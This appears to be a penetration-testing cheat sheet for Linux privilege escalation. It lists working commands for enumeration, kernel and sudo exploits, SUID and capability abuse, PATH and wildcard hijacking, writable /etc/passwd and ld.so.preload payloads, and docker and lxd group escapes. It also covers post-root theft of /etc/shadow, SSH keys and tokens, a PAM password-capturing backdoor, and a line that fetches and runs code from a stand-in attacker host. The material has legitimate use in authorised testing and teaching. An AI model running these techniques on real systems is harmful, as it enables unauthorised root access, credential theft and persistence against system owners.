# Linux Privilege Escalation — Full Checklist & Techniques

## Table of Contents
1. [Enumeration Checklist](#enumeration)
2. [Kernel Exploits](#kernel)
3. [sudo Abuse](#sudo)
4. [SUID/SGID & Capabilities](#suid)
5. [PATH Hijacking](#path)
6. [Cron/Timers/Systemd](#cron)
7. [Wildcard Tricks](#wildcards)
8. [Environment Variable Abuse](#env)
9. [Writable Files → root](#writable)
10. [Interesting Groups](#groups)
11. [NFS](#nfs)
12. [Jail/Restricted Shell Escapes](#jails)
13. [D-Bus](#dbus)
14. [Kernel Module/modprobe](#kmod)
15. [Tooling](#tools)

<a name="enumeration"></a>
## 1. Enumeration Checklist

```bash
# System
(cat /proc/version || uname -a) 2>/dev/null
cat /etc/os-release 2>/dev/null
echo $PATH; (env || set) 2>/dev/null            # creds in env?
date; df -h; lscpu

# Defenses
aa-status 2>/dev/null; sestatus 2>/dev/null; cat /proc/sys/kernel/randomize_va_space

# Drives & fstab creds
ls /dev 2>/dev/null | grep -i "sd"
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null

# Installed software + compilers
dpkg -l 2>/dev/null | head -40; rpm -qa 2>/dev/null | head -40
which nmap nc wget curl gcc gdb python python3 perl php docker lxc ctr runc kubectl sudo doas 2>/dev/null

# Processes (look for root processes, electron --inspect, deleted exes)
ps aux; ps -ef
lsof +L1                                          # deleted-but-open files
ls -l /proc/<pid>/exe                             # "(deleted)" running image
cat /proc/<pid>/fd/<FD>                           # read via open FD

# Network (local-only services are gold)
ip a; ip route; (arp -a || ip neigh)
ss -tulpn; netstat -punta
nmap -sT -Pn --open -p- 127.0.0.1                 # localhost services
timeout 1 tcpdump 2>/dev/null                     # can sniff?
which dumpcap && getcap "$(which dumpcap)"

# Users
id; cat /etc/passwd | cut -d: -f1
cat /etc/passwd | grep "sh$"                       # shell users
awk -F: '($3 == "0") {print}' /etc/passwd         # uid 0
w; last | tail; grep -R PASS /etc/login.defs 2>/dev/null | head

# Known passwords? Try `su - user` for each.
```

<a name="kernel"></a>
## 2. Kernel Exploits (fallback)

```bash
uname -r
# Search: searchsploit "Linux Kernel"; Google the exact version
# Compiled exploit packs:
#   github.com/lucyoa/kernel-exploits
#   github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack
#   exploitdb-bin-sploits
# Suggesters: linux-exploit-suggester(2), linuxprivchecker.py, linpeas, metasploit local_exploit_suggester

# DirtyCow (CVE-2016-5195, kernel <= 3.19.0-73.8 family):
echo 0 > /proc/sys/vm/dirty_writeback_centisecs   # stabilize
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil

# sudo itself:
sudo -V | grep "Sudo ver"
sudo -u#-1 /bin/bash                               # sudo < 1.8.28
# CVE-2019-14287: sudo -u#-1 id  (1.8.28-ish .. 1.8.30p1)
# CVE-2025-32463: sudo --chroot (1.9.14–1.9.17<p1) PoC pr0v3rbs/CVE-2025-32463_chwoot
# CVE-2025-32462: sudo -h <allowed-hostname> spoofs host rules (1.8.8–1.9.17)

# Big UID bug (CVE-2018-19788, polkit): UID > INT_MAX user → systemd-run -t /bin/bash

# 2024–2026 kernel LPE research in wiki:
#   CVE-2026-31431 AF_ALG+splice page-cache overwrite (SUID binary cache rewrite; mitigation:
#     echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf)
#   CVE-2025-38352 posix cpu timers TOCTOU
#   ptrace exit-race + pidfd_getfd FD theft
```

<a name="sudo"></a>
## 3. sudo Abuse

```bash
sudo -l          # THE command. Note: NOPASSWD, SETENV, env_keep, wildcards, relative paths
find / -perm -4000 2>/dev/null
```

**GTFOBins-style exec (sudo <binary>):**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo /usr/bin/vim -c ':!/bin/sh'
less → !/bin/sh ; man man → !/bin/sh
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
sudo python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh";'
sudo ruby -e 'exec "/bin/sh"'
sudo node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'
ftp> !/bin/sh
```

**Path/wildcard bypasses in sudoers:**
```bash
sudo less /var/log/../../etc/shadow          # path traversal
sudo less /var/log/something /etc/shadow     # extra args
ln -s /etc/shadow /var/log/new && sudo less /var/log/new   # symlink
# command without path in sudoers ("less" not "/usr/bin/less") → PATH hijack:
export PATH=/tmp:$PATH
```

**Environment abuse (sudo -l shows SETENV or env_keep+=...):**
```bash
sudo LD_PRELOAD=/tmp/pe.so anycommand        # env_keep+=LD_PRELOAD
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # env_keep BASH_ENV
sudo env_keep+=PATH / secure_path writable dir → shadow relative commands
# Terraform + !env_reset: ~/.terraformrc dev_overrides → fake provider plugin
# TF_VAR_xxx + symlink validation bypass for file read/write
```

**Writable `__pycache__` poisoning** (sudo python script imports a module whose cache dir is writable):
- keep original 16-byte pyc header + marshal.dumps(malicious code object); delete & recreate file; rerun sudo script.

**sudo tokens**: `/run/sudo/ts/<user>` writable → replay; `sudo -S` password reuse.

<a name="suid"></a>
## 4. SUID/SGID & Capabilities

```bash
find / -perm -4000 -type f -ls 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

**SUID shared-library abuse:**
```bash
ldd /path/to/suid; readelf -d /path/to/suid | egrep 'NEEDED|RPATH|RUNPATH'
strace -f -e trace=openat,access /path/to/suid 2>&1 | grep -Ei 'ENOENT|\.so'  # missing .so → plant it
# constructor payload:
# __attribute__((constructor)) static void init(){ setuid(0); setgid(0); system("id"); }
# gcc -shared -fPIC proof.c -o /writable/path/libexample.so
```

**/etc/ld.so.preload & ld.so.conf**: writable → plant malicious .so (see §9). glibc-hwcaps shadowing on modern glibc.

**Capabilities cheatsheet** (`capsh --decode=0x...`):
| Capability | Exploit |
|---|---|
| cap_setuid | `python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'` (on that binary) |
| cap_sys_admin | mount bind over /etc/passwd (ctypes libc.mount MS_BIND); container escapes; cgroup release_agent; core_pattern |
| cap_sys_module | insmod malicious .ko (runs root code at init) |
| cap_sys_ptrace | inject shellcode into root process via ptrace (python PoC in wiki) |
| cap_dac_read_search | read /etc/shadow, /root/* ; container host read |
| cap_net_admin+raw | sniff/MITM, iptables manipulation |
| cap_sys_chroot | chroot escape combos |
| cap_sys_boot | reboot tricks |
| cap_syslog | read kernel dmesg secrets |
| cap_mknod | mknod host block device → read host disk |
| cap_setpcap | grant caps to processes |
| cap_linux_immutable | clear chattr +i |

<a name="path"></a>
## 5. PATH Hijacking

```bash
echo $PATH   # writable dir in PATH + root executes a relative-path command → plant it
# cron/systemd services calling relative binaries, logrotate, run-parts, backups scripts
# staff group: /usr/local/bin precedes /usr/bin in PATH → e.g. plant `run-parts`
pspy64  # confirm what root actually runs with which PATH
```

<a name="cron"></a>
## 6. Cron / Timers / Systemd

```bash
cat /etc/crontab; cat /etc/anacrontab; ls -la /etc/cron.* /var/spool/cron*
crontab -l 2>/dev/null
systemctl list-timers --all
pspy64    # live monitor for cron/root jobs
```
Vectors: writable cron script; cron PATH hijack (PATH= in crontab); wildcard args (see §7); writable `.service`/`.timer`/`.socket` unit files (ExecStart=, Unit=, ExecStartPre=); socket activation + missing service unit + writable /etc/systemd/system → create the service, trigger socket traffic.

<a name="wildcards"></a>
## 7. Wildcard Tricks

```bash
# tar in dir you control:
echo 'echo pwned > /tmp/pwn' > shell.sh; chmod +x shell.sh
touch -- "--checkpoint=1" "--checkpoint-action=exec=sh shell.sh"
# rsync: touch -- "-e sh shell.sh"
# bsdtar/macOS: touch -- "--use-compress-program=sh"
# 7z: symlink root.txt + touch @root.txt (list file, read /etc/shadow)
# zip: filenames literally named "-T" and "-TT wget attacker/x;sh x"
# chown/chmod: touch -- "--reference=.drf.php"
# other option-inject candidates: flock -c, git -c core.sshCommand, scp -S
# tcpdump -G/-z hooks & -w/-F/-V/-Z root arbitrary write/read via sudoers rules
# Hunt: rg '(tar|bsdtar|rsync|zip|7z|chown|chmod|tcpdump).*(\*|\$@|\$\*)' /etc /opt /usr/local /srv
```

<a name="env"></a>
## 8. Environment Variable Abuse

Hijack vectors when env passes to privileged context (sudo SETENV/env_keep, cron, systemd, suid wrappers):
- PATH, HOME/XDG_CONFIG_HOME, BASH_ENV/ENV, LD_PRELOAD/LD_LIBRARY_PATH/LD_AUDIT, GLIBC_TUNABLES
- PYTHONPATH/PYTHONHOME/PYTHONSTARTUP, PERL5OPT/PERL5LIB, NODE_OPTIONS='--require /tmp/preload.js', RUBYLIB/RUBYOPT
- PAGER='sh -c "exec sh 0<&1"' man man; LESSOPEN='|/tmp/lesspipe.sh %s'; GIT_CONFIG_KEY_0=core.pager
- Get chars from env when restricted: ${PATH:0:1} = "/", ${LS_COLORS:10:1} = ";"

<a name="writable"></a>
## 9. Writable Files → root

```bash
# writable /etc/passwd:
openssl passwd -1 -salt hacker hacker
# append: hacker:$1$hacker$...:0:0:Hacker:/root:/bin/bash   → su hacker
# or: echo 'dummy::0:0::/root:/bin/bash' >> /etc/passwd

# /etc/ld.so.preload writable → pe.so with _init(){setuid(0);system("/bin/bash");}
#   compile: gcc -fPIC -shared -o pe.so pe.c -nostartfiles

# Git hooks (repo root writable, root gits there): .git/hooks/pre-commit
# systemd: overwrite ExecStart= of a service + systemctl daemon-reload + restart
# php.ini used by privileged PHP sandbox → disable_functions=
# root runs scripts in your dir → replace (pspy to find)
# binfmt_misc registration; MIME x-scheme-handler desktop entries
# ACLs: getfacl -t -s -R -p /etc /bin /usr 2>/dev/null ; setfacl -m u:me:rw /etc/sudoers.d/file
# backups: find /var /etc /home /root /tmp /usr -type f \( -name "*backup*" -o -name "*.bak" \) 2>/dev/null
# history/creds files: find / -type f \( -name "*_history" -o -name ".git-credentials" -o -name ".htpasswd" ... \)
# screen/tmux hijack: screen -ls; screen -dr <sess>; tmux -S /tmp/dev_sess attach -t 0
```

<a name="groups"></a>
## 10. Interesting Groups

| Group | Escalation |
|---|---|
| sudo/wheel | `sudo su`; polkit pkexec (pkttyagent dual-session trick) |
| shadow | read/edit /etc/shadow |
| disk | `debugfs /dev/sda1` → read /root/.ssh/id_rsa, /etc/shadow |
| docker | `docker run -v /:/mnt --rm -it <img> chroot /mnt bash` |
| lxc/lxd | build alpine image → `lxc init img x -c security.privileged=true` → `lxc config device add x root disk source=/ path=/mnt/root` → exec |
| staff | write /usr/local/bin binaries ahead of PATH |
| video | read /dev/fb0 (screen contents) |
| adm | read logs for creds |
| root | `find / -group root -perm -g=w 2>/dev/null` |

<a name="nfs"></a>
## 11. NFS no_root_squash

```bash
# attacker (root): mount -t nfs <IP>:<share> /tmp/pe; cp /bin/bash .; chmod +s bash
# victim: cd share; ./bash -p    → root
# local variant: libnfs LD_PRELOAD (ld_nfs.so) writes as uid 0
```

<a name="jails"></a>
## 12. Jail / Restricted Shell Escapes

```bash
# enumerate: echo $0 $SHELL $PATH; compgen -c | sort -u; enable -a; set -o
vim :set shell=/bin/sh :shell ; less !/bin/sh ; awk 'BEGIN{system("/bin/sh")}'
find . -exec /bin/sh \; -quit ; script /dev/null -c bash
ssh user@host -t "bash --noprofile -i" ; ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
declare -n PATH; export PATH=/bin; bash -i ; BASH_CMDS[shell]=/bin/bash; shell -i
# chroot escape (root inside): mkdir d; chroot d; for i in $(seq 1000); do cd ..; done; chroot .; /bin/bash
# Lua: load(string.char(0x6f,...))() ; debug.debug()
# command-restriction bypasses: p?ng, who*mi, n[c], 'p'i'n'g, \u\n\a\m\e, $@, tr case, rev, base64<<<,
#   uninitialized vars $u, ${IFS}, {cat,file}, X=$'cat\x20/etc/passwd'&&$X, hex escapes, !-1!-2 history
```

<a name="dbus"></a>
## 13. D-Bus

```bash
busctl list; busctl tree <svc>; busctl introspect <svc> <path>
busctl monitor <svc>          # watch traffic
dbus-send --system --print-reply --dest=<svc> <path> <iface>.<Method> string:'PAYLOAD'
# check /etc/dbus-1/system.d/*.conf policies for your user/group allow send_destination
# command injection into root daemons that system() user strings (HTB Oouch pattern)
```

<a name="kmod"></a>
## 14. Kernel Modules / modprobe

```bash
cat /proc/sys/kernel/modprobe            # writable path → helper script runs on module autoload trigger
find /lib/modules/$(uname -r) -writable  # writable .ko → replace; sudo insmod your .ko
# trigger modprobe: mount -t nonexistent none /mnt (needs mount priv)
```

<a name="tools"></a>
## 15. Tooling

LinPEAS (best), LinEnum, enumy, unix-privesc-check, linuxprivchecker, BeRoot, kernelpop, pspy,
metasploit multi/recon/local_exploit_suggester, linux-exploit-suggester.
Static impacket binaries: github.com/ropnop/impacket_static_binaries.

## Post-root Linux harvesting (quick)
```bash
cat /etc/shadow /root/.ssh/* /home/*/.ssh/* /home/*/.bash_history
grep -RilE 'pass|token|key' /root /home /opt /var/www /etc 2>/dev/null | head -50
find / -name "*.db" -o -name "*.sqlite*" -o -name "*.kdbx" 2>/dev/null
# PAM backdoor (persistence, needs authorization):
# auth optional pam_exec.so quiet expose_authtok /usr/local/bin/hook.sh in /etc/pam.d/common-auth
# GPG loot: copy ~/.gnupg to writable homedir, GNUPGHOME=... gpg -d
# systemd Environment= secrets: grep -R "^Environment=" /etc/systemd /lib/systemd
```
